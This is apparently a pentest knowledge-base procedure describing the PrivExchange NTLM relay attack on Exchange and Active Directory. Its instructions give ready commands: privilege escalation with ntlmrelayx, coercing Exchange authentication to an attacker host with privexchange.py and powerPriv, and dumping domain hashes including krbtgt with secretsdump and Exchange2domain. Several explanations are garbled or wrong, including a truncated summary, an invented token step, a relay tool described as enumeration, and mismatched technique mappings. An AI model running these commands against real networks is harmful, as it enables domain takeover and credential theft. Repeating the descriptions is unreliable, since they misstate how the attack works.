---
id: b563d5dd-4a0e-4bea-b502-4f87d007b906
name: PrivExchange Attack with NTLM Relay
type: procedure
verified: false
submitted: false
created_at: '2023-04-06T03:56:08.058135+00:00'
updated_at: '2023-04-10T20:26:32.331421+00:00'
tactics:
- '[[Credential Access|TA0006 - Credential Access]]'
- '[[Defense Evasion|TA0005 - Defense Evasion]]'
- '[[Lateral Movement|TA0008 - Lateral Movement]]'
techniques:
- '[[Brute Force|T1110 - Brute Force]]'
- '[[Use Alternate Authentication Material|T1550 - Use Alternate Authentication Material]]'
sub_techniques:
- '[[Credential Stuffing|T1110.004 - Credential Stuffing]]'
- '[[Pass the Hash|T1550.002 - Pass the Hash]]'
- '[[Pass the Ticket|T1550.003 - Pass the Ticket]]'
tags:
- '[[Active Directory Attacks]]'
- '[[PrivExchange attack]]'
commands:
- '[[Clone Exchange2domain repository from Github]]'
- '[[Extract NTLM hashes using secretsdump.py]]'
- '[[Get Group Members of Exchange Servers]]'
- '[[NTLM RelayX escalate user to username]]'
- '[[PowerPriv - Attack Exchange Server]]'
- '[[PrivExchange.py - Attack Exchange Server]]'
- '[[PrivExchange.py - Attack Exchange Server]]'
- '[[Restore ACLPwn backup]]'
- '[[Run Exchange2domain script with attacker IP, listen port, username, password,
  domain, DC IP and Mail Server IP]]'
- '[[Run Exchange2domain script with attacker IP, username, password, domain, DC IP
  and Mail Server IP]]'
---

# PrivExchange Attack with NTLM Relay

## Summary

The PrivExchange attack is a technique that allows an attacker to perform NTLM relay attacks on Exchange servers, which can lead to privilege escalation and domain compromise. The attack relies on Exchange Web Services (EWS) and requires the attacker to have valid credentials for a domain user with

## Description

# Description

The PrivExchange attack is a technique that allows an attacker to perform NTLM relay attacks on Exchange servers, which can lead to privilege escalation and domain compromise. The attack relies on Exchange Web Services (EWS) and requires the attacker to have valid credentials for a domain user with access to Exchange servers. The attack can be performed in just a few steps, making it a quick and effective way to gain access to sensitive data.

To perform the attack, the attacker first sends a specially crafted EWS request to the Exchange server. This request includes a modified security token that allows the attacker to authenticate as the targeted user. The attacker then relays the authentication request to a domain controller using the NTLM protocol, which can result in elevated privileges and access to sensitive data.

The business value of this attack lies in the ability to gain access to sensitive data, such as emails and files, which can be used for corporate espionage or other malicious purposes.

## Requirements

1. Valid credentials for a domain user with access to Exchange servers

1. Access to Exchange Web Services (EWS)

## Defense

1. Implementing multi-factor authentication (MFA) for Exchange servers and domain accounts can prevent the use of stolen credentials for this attack.

1. Limiting access to Exchange servers and domain controllers can prevent attackers from performing the attack.

1. Monitoring for suspicious EWS requests and NTLM authentication attempts can help detect and prevent this attack.

## Objectives

1. Gain access to sensitive data on Exchange servers

1. Escalate privileges and compromise the domain

# Instructions

1. This command lists the members of the 'Exchange Servers' group on the domain controller 'dc01.domain.local'.

**Code**: [[pth-net rpc group members "Exchange Servers" -I dc]]

> The 'pth-net rpc' command is used to remotely execute RPC (Remote Procedure Call) commands on Windows systems. In this case, we are using it to list the members of a specific group on the domain controller. The '-I' option specifies the hostname or IP address of the domain controller and the '-U' option specifies the username to use for authentication. The group name is enclosed in double quotes to handle spaces in the name. This command can be useful for troubleshooting Exchange server issues or for verifying group membership.

**Command** ([[Get Group Members of Exchange Servers]]):

```bash
pth-net rpc group members "Exchange Servers" -I dc01.domain.local -U domain/username
```

2. To execute this command, run the ntlmrelayx.py script with the target LDAP server specified using the -t flag, followed by the domain user account that will be used to escalate privileges using the --escalate-user flag.

**Code**: [[ntlmrelayx.py -t ldap://dc01.domain.local --escala]]

> This command allows for the relay of Exchange server authentication and privilege escalation using the ntlmrelayx tool from Impacket. The -t flag specifies the target LDAP server, while the --escalate-user flag specifies the domain user account that will be used to escalate privileges. This command can be used to gain elevated access to the Exchange server or other systems on the network.

**Command** ([[NTLM RelayX escalate user to username]]):

```bash
ntlmrelayx.py -t ldap://dc01.domain.local --escalate-user username
```

3. To use this command, first download either privexchange.py or powerPriv from the provided links. Then, run the appropriate command with the necessary arguments, including the target Exchange server's address, domain name, and the credentials of a valid user account. The command will then subscribe to the push notification feature and retrieve the server's NTLMv2 hash.

**Code**: [[# https://github.com/dirkjanm/PrivExchange/blob/ma]]

> The push notification feature of an Exchange server allows users to receive real-time updates for new emails and calendar events. By using this feature, an attacker can force the server to send back its NTLMv2 hash, which can be used to perform pass-the-hash attacks and gain unauthorized access to the server. This command should only be used for authorized penetration testing purposes.

**Command** ([[PrivExchange.py - Attack Exchange Server]]):

```bash
python privexchange.py -ah xxxxxxx -u xxxx -d xxxxx
```

**Command** ([[PrivExchange.py - Attack Exchange Server]]):

```bash
python privexchange.py -ah 10.0.0.2 mail01.domain.local -d domain.local -u user_exchange -p pass_exchange
```

**Command** ([[PowerPriv - Attack Exchange Server]]):

```bash
powerPriv -targetHost corpExch01 -attackerHost 192.168.1.17 -Version 2016
```

4. To use this command, replace 'xxxxxxxxxx' with the appropriate credentials or specify a target domain controller with the '-just-dc' flag. The second command can be used to dump the NTDS.dit file and extract password hashes, including the NTLM hash of the target user. The '-history' flag can be used to dump the password history for all users in the domain.

**Code**: [[python secretsdump.py xxxxxxxxxx -just-dc
python s]]

> This command utilizes the 'secretsdump.py' tool from Impacket to extract password hashes from a Windows domain controller. The first command can be used to extract password hashes for the current user or a specified user. The second command can be used to extract password hashes from the NTDS.dit file, which contains all password hashes for the domain. The '-just-dc' flag specifies that only the domain controller specified should be targeted. The '-history' flag can be used to dump the password history for all users in the domain. These password hashes can then be used to perform a pass-the-hash attack or crack the hashes to obtain the plaintext passwords.

**Command** ([[Extract NTLM hashes using secretsdump.py]]):

```bash
python secretsdump.py xxxxxxxxxx -just-dc
python secretsdump.py lab/buff@192.168.0.2 -ntds ntds -history -just-dc-ntlm
```

5. To restore a previous state of the user's ACL, run the following command:

**Code**: [[python aclpwn.py --restore ../aclpwn-20190319-1257]]

> This command will use the 'aclpwn.py' script to restore a previously saved state of the user's ACL. This can be useful if you have made changes to the user's ACL and want to revert back to a previous state. The '--restore' flag specifies that you want to restore the ACL, and the '../aclpwn-20190319-125741.restore' argument specifies the path to the previously saved ACL state file. Make sure to replace this argument with the correct path to your saved ACL state file. Once you run this command, the user's ACL will be restored to the state saved in the specified file.

**Command** ([[Restore ACLPwn backup]]):

```bash
python aclpwn.py --restore ../aclpwn-20190319-125741.restore
```

6. To use this tool, first clone the Exchange2domain repository from github. Then, run the Python script with the appropriate command line arguments. The first command will perform a full enumeration of the Exchange server and the domain. The second command will only enumerate the domain controller user accounts. The -ah flag specifies the IP address of the attacking machine, the -ap flag specifies the port to listen on for incoming connections, the -u flag specifies the username to authenticate with, the -p flag specifies the password to authenticate with, the -d flag specifies the domain to enumerate, the -th flag specifies the IP address of the target domain controller, and the final argument specifies the IP address of the Exchange server. 

**Code**: [[git clone github.com/Ridter/Exchange2domain 
pytho]]

> This tool is used for enumerating user accounts on an Exchange server and the associated domain. The first command will enumerate all user accounts and the second command will only enumerate the domain controller user accounts. The tool requires authentication credentials and the IP address of the target domain controller and Exchange server. The Metasploit module can also be used as an alternative to this tool.

**Command** ([[Clone Exchange2domain repository from Github]]):

```bash
git clone github.com/Ridter/Exchange2domain
```

**Command** ([[Run Exchange2domain script with attacker IP, listen port, username, password, domain, DC IP and Mail Server IP]]):

```bash
python Exchange2domain.py -ah [attacker IP] -ap [listen port] -u [username] -p [password] -d [domain] -th [DC IP] [Mail Server IP]
```

**Command** ([[Run Exchange2domain script with attacker IP, username, password, domain, DC IP and Mail Server IP]]):

```bash
python Exchange2domain.py -ah [attacker IP] -u [username] -p [password] -d [domain] -th [DC IP] --just-dc-user krbtgt [Mail Server IP]
```

## MITRE ATT&CK Mapping

### Tactics

- [[Credential Access|TA0006 - Credential Access]]
- [[Defense Evasion|TA0005 - Defense Evasion]]
- [[Lateral Movement|TA0008 - Lateral Movement]]

### Techniques

- [[Brute Force|T1110 - Brute Force]]
- [[Use Alternate Authentication Material|T1550 - Use Alternate Authentication Material]]

### Sub-Techniques

- [[Credential Stuffing|T1110.004 - Credential Stuffing]]
- [[Pass the Hash|T1550.002 - Pass the Hash]]
- [[Pass the Ticket|T1550.003 - Pass the Ticket]]

## Commands Used

- [[Clone Exchange2domain repository from Github]]
- [[Extract NTLM hashes using secretsdump.py]]
- [[Get Group Members of Exchange Servers]]
- [[NTLM RelayX escalate user to username]]
- [[PowerPriv - Attack Exchange Server]]
- [[PrivExchange.py - Attack Exchange Server]]
- [[PrivExchange.py - Attack Exchange Server]]
- [[Restore ACLPwn backup]]
- [[Run Exchange2domain script with attacker IP, listen port, username, password, domain, DC IP and Mail Server IP]]
- [[Run Exchange2domain script with attacker IP, username, password, domain, DC IP and Mail Server IP]]

## Tags

- [[Active Directory Attacks]]
- [[PrivExchange attack]]
